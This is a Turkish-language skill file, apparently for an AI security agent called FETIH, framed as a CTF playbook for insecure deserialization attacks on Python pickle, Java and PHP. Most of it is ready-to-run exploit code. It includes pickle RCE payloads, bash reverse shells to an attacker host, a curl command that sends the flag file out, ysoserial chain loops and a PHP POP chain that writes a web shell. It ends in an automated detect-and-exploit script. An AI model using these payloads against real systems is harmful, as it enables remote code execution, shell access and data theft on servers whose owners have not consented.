---
name: deserialization
description: Insecure deserialization — Python pickle, Java, PHP object injection ile RCE
tags: [ctf, web, deserialization, pickle, java, php, object-injection, rce]
triggers:
  - "deserialization"
  - "pickle"
  - "unserialize"
  - "ObjectInputStream"
  - "serialized object"
  - "base64 encoded object"
  - "ysoserial"
difficulty: hard
category: web
solved_challenges:
  - "Real World CTF 2024 - Chatterbox (Java Spring deserialization chain)"
  - "çeşitli CTF pickle RCE"
adapted_for: fetih
---

# Insecure Deserialization

## Python Pickle RCE

Pickle, Python'un en tehlikeli serializasyon formatıdır. `pickle.loads()` çağrısı doğrudan RCE verir. CTF'te en yaygın görülen deserialization senaryosu.

### Tespit

```python
# Pickle serialized data genellikle şu byte'larla başlar:
# \x80\x04  — protocol 4
# \x80\x05  — protocol 5
# (         — protocol 0 (ASCII)
# ]         — protocol 2
# Base64 decode ettikten sonra bu byte'ları kontrol et

import base64

def is_pickle(data_b64):
    try:
        raw = base64.b64decode(data_b64)
        # Pickle magic bytes
        return raw[:2] in [b'\x80\x02', b'\x80\x03', b'\x80\x04', b'\x80\x05'] or raw[0:1] in [b'(', b']', b'}']
    except Exception:
        return False
```

### Temel Pickle RCE Şablonu

```python
import pickle
import os
import base64

class RCE:
    """__reduce__ metodunu override ederek pickle.loads() sırasında keyfi kod çalıştır"""

    def __init__(self, command):
        self.command = command

    def __reduce__(self):
        # pickle.loads() çağrıldığında os.system(command) çalışır
        return (os.system, (self.command,))


# Komut çalıştırma
payload = pickle.dumps(RCE("id"))
print("Raw payload:", payload)
print("Base64:", base64.b64encode(payload).decode())

# Reverse shell payload
LHOST = "10.10.14.X"
LPORT = 4444
cmd = f"bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'"

shell_payload = pickle.dumps(RCE(cmd))
shell_b64 = base64.b64encode(shell_payload).decode()
print("Shell payload (base64):", shell_b64)
```

### Pickle RCE — Gelişmiş (subprocess ile çıktı yakala)

```python
import pickle
import subprocess
import base64

class PickleRCE:
    def __init__(self, cmd):
        self.cmd = cmd

    def __reduce__(self):
        # subprocess.check_output ile çıktıyı al
        return (subprocess.check_output, (["/bin/bash", "-c", self.cmd],))


# Kullanım
payload = pickle.dumps(PickleRCE("id"))
b64 = base64.b64encode(payload).decode()
print(b64)

# Sunucuya gönder
import requests
TARGET = "http://<IP>:<PORT>"

r = requests.post(f"{TARGET}/api/deserialize", json={"data": b64})
print(r.text)  # "uid=1000(www-data)..." gibi çıktı
```

### Pickle — Opcode Manuel Craft

```python
# Filtreleme varsa (pickle module import engeli) opcode ile bypass
import pickle
import io

# Manuel pickle opcode oluştur
def craft_pickle_payload(command):
    """
    Filtrelemeden kaçmak için manuel opcode.
    os.system yerine __builtins__.__import__ kullanır.
    """
    payload = b"".join([
        b"\x80\x04",          # Protocol 4
        b"\x95",              # FRAME
        len(command).to_bytes(8, 'little'),
        b"c",                 # GLOBAL opcode
        b"os\nsystem\n",     # os.system referansı
        b"(",                 # MARK
        b"X",                 # SHORT_BINUNICODE
        len(command).to_bytes(4, 'little'),
        command.encode(),
        b"t",                 # TUPLE (from MARK)
        b"R",                 # REDUCE — fonksiyonu çağır
        b".",                 # STOP
    ])
    return payload

# Daha temiz yöntem — pickletools ile debug
import pickletools

normal_payload = pickle.dumps(RCE("id"), protocol=2)
pickletools.dis(normal_payload)
```

### CTF'te Pickle Nasıl Gönderilir?

```python
import requests
import pickle
import base64
import os

TARGET = "http://<IP>:<PORT>"

class Exploit:
    def __reduce__(self):
        return (os.system, ("curl http://LHOST:8000/$(cat /flag | base64)",))

payload_b64 = base64.b64encode(pickle.dumps(Exploit())).decode()

# Yöntem 1: JSON body
r = requests.post(f"{TARGET}/load", json={"pickle": payload_b64})

# Yöntem 2: Form data
r = requests.post(f"{TARGET}/load", data={"pickle": payload_b64})

# Yöntem 3: Cookie
r = requests.get(f"{TARGET}/", cookies={"session": payload_b64})

# Yöntem 4: Raw binary (multipart)
payload_raw = pickle.dumps(Exploit())
r = requests.post(
    f"{TARGET}/upload",
    files={"file": ("data.pkl", payload_raw, "application/octet-stream")}
)

print(r.status_code, r.text[:200])
```

---

## Java Deserialization (ysoserial)

### Tespit

Java serialized objeler her zaman `AC ED 00 05` magic bytes ile başlar (hex). Base64 decode ettikten sonra kontrol et.

```python
import base64

def is_java_serialized(data_b64):
    try:
        raw = base64.b64decode(data_b64)
        return raw[:4] == bytes([0xAC, 0xED, 0x00, 0x05])
    except Exception:
        return False

# Örnek: rO0AB... ile başlayan base64 = Java serialized object
sample = "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA=="
raw = base64.b64decode(sample + "==")
print(hex(raw[0]), hex(raw[1]), hex(raw[2]), hex(raw[3]))  # 0xac 0xed 0x0 0x5
```

### ysoserial Kullanımı

```bash
# ysoserial indir
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# Mevcut payload listesi
java -jar ysoserial-all.jar

# CommonsCollections6 ile RCE (en uyumlu payload)
java -jar ysoserial-all.jar CommonsCollections6 "id" | base64 -w 0

# Spring çağlı uygulama için Spring1/Spring2
java -jar ysoserial-all.jar Spring1 "curl http://LHOST:8000/?x=$(id|base64)" | base64 -w 0

# Groovy ile (Groovy classpath'te ise)
java -jar ysoserial-all.jar Groovy1 "bash -c {bash,-i,>&,/dev/tcp/LHOST/4444,0>&1}" | base64 -w 0
```

### Python'dan Java Deserial Saldırısı

```python
import subprocess
import requests
import base64

TARGET = "http://<IP>:<PORT>"
YSOSERIAL_JAR = "/tools/ysoserial-all.jar"
LHOST = "10.10.14.X"
LPORT = 4444

def generate_ysoserial(chain, command):
    """ysoserial ile payload üret"""
    result = subprocess.run(
        ["java", "-jar", YSOSERIAL_JAR, chain, command],
        capture_output=True
    )
    if result.returncode != 0:
        print("[!] ysoserial hata:", result.stderr.decode())
        return None
    return result.stdout


# Farklı chain'leri dene
chains = [
    "CommonsCollections1", "CommonsCollections2", "CommonsCollections3",
    "CommonsCollections4", "CommonsCollections5", "CommonsCollections6",
    "CommonsCollections7", "Spring1", "Spring2", "Groovy1",
    "JRMPClient", "Hibernate1", "BeanShell1"
]

cmd = f"bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'"

for chain in chains:
    print(f"[*] {chain} deneniyor...")
    payload = generate_ysoserial(chain, cmd)
    if payload is None:
        continue

    payload_b64 = base64.b64encode(payload).decode()

    # Gönder
    r = requests.post(
        f"{TARGET}/api/object",
        data=payload,
        headers={"Content-Type": "application/octet-stream"},
        timeout=5
    )

    if r.status_code == 200 or r.status_code == 500:
        print(f"    {chain}: {r.status_code} — reverse shell bağlantısı kontrol et")
    else:
        print(f"    {chain}: {r.status_code}")
```

### Real World CTF 2024 — Chatterbox Java Zinciri

**Senaryo:** Spring Boot uygulaması. HTTP endpoint serialized Java objesi alıyor. CommonsCollections veya Spring chain işliyor.

```python
import subprocess
import requests
import base64

TARGET = "http://<IP>:<PORT>"
LHOST = "SENIN_IP"
LPORT = 4444

# 1. nc dinle (ayrı terminalde):
# nc -nlvp 4444

# 2. Spring2 chain ile reverse shell payload üret
payload_raw = subprocess.check_output([
    "java", "-jar", "/tools/ysoserial-all.jar",
    "Spring2",
    f"bash -c {{bash,-i,>& /dev/tcp/{LHOST}/{LPORT},0>&1}}"
])

# 3. Gönder (base64 olarak veya raw binary olarak)
# Uygulama base64 bekliyorsa:
payload_b64 = base64.b64encode(payload_raw).decode()
r = requests.post(
    f"{TARGET}/deserialize",
    json={"data": payload_b64},
    headers={"Content-Type": "application/json"}
)
print(r.status_code)

# Uygulama raw binary bekliyorsa:
r = requests.post(
    f"{TARGET}/deserialize",
    data=payload_raw,
    headers={"Content-Type": "application/octet-stream"}
)
print(r.status_code)
```

---

## PHP Object Injection

### Tespit

PHP serialize formatı: `O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"guest";}` gibi görünür.

```python
import requests

TARGET = "http://<IP>:<PORT>"

# Cookie veya parametrede serialize edilmiş veri var mı?
r = requests.get(TARGET)
for header, value in r.cookies.items():
    if value.startswith("O:") or ":{" in value:
        print(f"[!] PHP serialized cookie: {header}={value}")

# Session verisi
for header, value in r.headers.items():
    if "O:" in value and ":{" in value:
        print(f"[!] PHP serialized header: {header}={value}")
```

### PHP POP Chain ile RCE

```python
import base64

# Hedef PHP koduna göre POP chain oluştur
# Örnek: __wakeup() veya __destruct() methodları olan bir class'ı hedef al

# Basit örnek: Logger class'ı __destruct() ile dosyaya yazıyor
php_payload = 'O:6:"Logger":1:{s:8:"filename";s:24:"/var/www/html/shell.php";}'

# PHP shell içeren object injection
# Uygulamada FileLogger gibi bir class varsa:
php_payload_rce = 'O:10:"FileLogger":2:{s:4:"file";s:24:"/var/www/html/pwned.php";s:7:"content";s:26:"<?php system($_GET[\'c\']); ?>";}'

# URL encode ederek gönder
import requests
import urllib.parse

TARGET = "http://<IP>:<PORT>"

r = requests.get(
    f"{TARGET}/profile",
    cookies={"data": urllib.parse.quote(php_payload_rce)}
)
print(r.status_code)

# Shell oluşturulduysa çalıştır
r = requests.get(f"{TARGET}/pwned.php", params={"c": "id"})
print(r.text)
```

### phpggc (PHP Gadget Chains) Aracı

```bash
# phpggc kurulum
git clone https://github.com/ambionics/phpggc
cd phpggc

# Mevcut gadget chain'leri listele
php phpggc -l

# Laravel/Symfony/Guzzle ile chain oluştur
php phpggc Laravel/RCE1 system "id" -b  # base64 output
php phpggc Symfony/RCE3 exec "bash -c 'bash -i >& /dev/tcp/LHOST/4444 0>&1'" -b

# Python'dan phpggc çağır
import subprocess

result = subprocess.check_output([
    "php", "/tools/phpggc/phpggc",
    "Laravel/RCE1", "system", "id", "-b"
])
payload = result.decode().strip()
print("PHP payload:", payload)
```

---

## Tam Exploit Şablonları

### Universal Deserialization Test Script

```python
#!/usr/bin/env python3
"""
CTF Deserialization Universal Tester
Pickle, Java ve PHP deserial varlığını otomatik algılar ve sömürür.
"""

import requests
import base64
import pickle
import os
import subprocess
import sys

TARGET = "http://<IP>:<PORT>"
LHOST = "10.10.14.X"
LPORT = 4444
SESSION = requests.Session()
# SESSION.proxies = {"http": "http://127.0.0.1:8080"}


# ========== PICKLE ==========
class PickleExploit:
    def __init__(self, cmd):
        self.cmd = cmd

    def __reduce__(self):
        return (os.system, (self.cmd,))


def pickle_payload(cmd):
    return base64.b64encode(pickle.dumps(PickleExploit(cmd))).decode()


# ========== JAVA ==========
def java_payload(chain, cmd, jar="/tools/ysoserial-all.jar"):
    try:
        raw = subprocess.check_output(
            ["java", "-jar", jar, chain, cmd],
            stderr=subprocess.DEVNULL
        )
        return base64.b64encode(raw).decode()
    except Exception as e:
        return None


# ========== TEST ==========
def test_endpoint(url, param_name, param_location="json"):
    """Endpoint'i farklı deserial payload'larla test et"""

    # 1. Pickle test
    print("[*] Pickle test ediliyor...")
    p = pickle_payload("curl http://LHOST:8001/pickle_hit")
    
    if param_location == "json":
        r = SESSION.post(url, json={param_name: p})
    elif param_location == "cookie":
        r = SESSION.get(url, cookies={param_name: p})
    elif param_location == "form":
        r = SESSION.post(url, data={param_name: p})
    
    print(f"    Status: {r.status_code}")

    # 2. Java test (CommonsCollections6 — en evrensel)
    print("[*] Java CommonsCollections6 test ediliyor...")
    jp = java_payload("CommonsCollections6", "curl http://LHOST:8001/java_hit")
    if jp:
        if param_location == "json":
            r = SESSION.post(url, json={param_name: jp})
        print(f"    Status: {r.status_code}")

    print("[!] HTTP server'ını kontrol et: python3 -m http.server 8001")
    print("    Pickle hit veya Java hit görüyorsan deserial çalışıyor!")


def exploit(url, param_name, deserial_type="pickle", param_location="json"):
    """Reverse shell gönder"""
    cmd = f"bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'"

    if deserial_type == "pickle":
        payload = pickle_payload(cmd)
    elif deserial_type.startswith("java:"):
        chain = deserial_type.split(":")[1]  # "java:CommonsCollections6"
        payload = java_payload(chain, cmd)

    print(f"[*] Reverse shell gönderiliyor ({deserial_type})...")
    print(f"    Dinle: nc -nlvp {LPORT}")

    if param_location == "json":
        r = SESSION.post(url, json={param_name: payload})
    elif param_location == "cookie":
        r = SESSION.get(url, cookies={param_name: payload})
    elif param_location == "form":
        r = SESSION.post(url, data={param_name: payload})

    print(f"    Status: {r.status_code}")


if __name__ == "__main__":
    # Önce test et
    test_endpoint(f"{TARGET}/api/load", "data", "json")

    # Çalışıyorsa exploit et
    # exploit(f"{TARGET}/api/load", "data", "pickle", "json")
    # exploit(f"{TARGET}/api/load", "data", "java:CommonsCollections6", "json")
```

---

## Tuzaklar

- **Pickle bytes bozuldu:** HTTP üzerinden binary gönderirken base64 kullan. Raw binary `\x00` byte'ları HTTP body'de kaybolabilir.
- **Pickle filtreleme:** `__reduce__` veya `os` modülü filtreleniyorsa `__reduce_ex__` veya `importlib` ile alternatif yol dene.
- **Java classpath sorunu:** ysoserial chain çalışmıyorsa hedef uygulamanın dependency listesine bak (`pom.xml`, `build.gradle`). Hangi kütüphane varsa o chain'i seç.
- **PHP `__wakeup` bypass:** PHP 5.x'te `__wakeup` bypass: object property sayısını gerçekten fazla yaz: `O:4:"Foo":999:{...}` — 999 > gerçek property sayısı.
- **Java JRMPClient (out-of-band):** Direkt RCE chain işlemiyorsa `JRMPClient` ile önce JRMP listener'a callback al, sonra oradan payload gönder.
- **Deserialization yeri:** Cookie, body, upload, query param — hepsini kontrol et. Özellikle `viewstate` (ASP.NET), `session` cookie, `__pickle__` parametrelerine dikkat.
- **Burp Deserialization Scanner:** Burp Pro kullanıyorsan Deserialization Scanner extension'ı yükle, otomatik Java chain deneme yapar.

<!--
  ⚔ Bu skill FETIH AI Agent icin gelistirilmistir — https://github.com/MustafaKemal0146/fetih
  Yetkisiz kullanim/kopyalama tespit edilebilir.
  hash: f52e07e28403e316
-->

